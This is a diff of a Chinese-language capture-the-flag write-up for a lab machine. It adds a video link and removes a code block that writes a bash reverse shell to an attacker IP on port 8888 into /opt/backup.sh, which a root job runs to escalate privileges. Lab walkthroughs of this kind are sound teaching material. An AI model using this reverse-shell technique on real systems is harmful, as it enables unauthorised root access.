@@ -2,6 +2,8 @@
 
 2025.03.08 https://thehackerslabs.com/academy/
 
+[video](https://www.bilibili.com/video/BV1Ed9XY9E4i/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)
+
 ## Ip
 
 192.168.5.40
@@ -50,12 +52,6 @@ chmod +x /opt/backup.sh
 ```
 
 在 kali 上监听 8888，过了 1 分钟得到了 root 反弹的 shell：
-
-```
-echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' > /opt/backup.sh
-chmod +x /opt/backup.sh
-
-```
 
 拿到 2 个 flag:
 
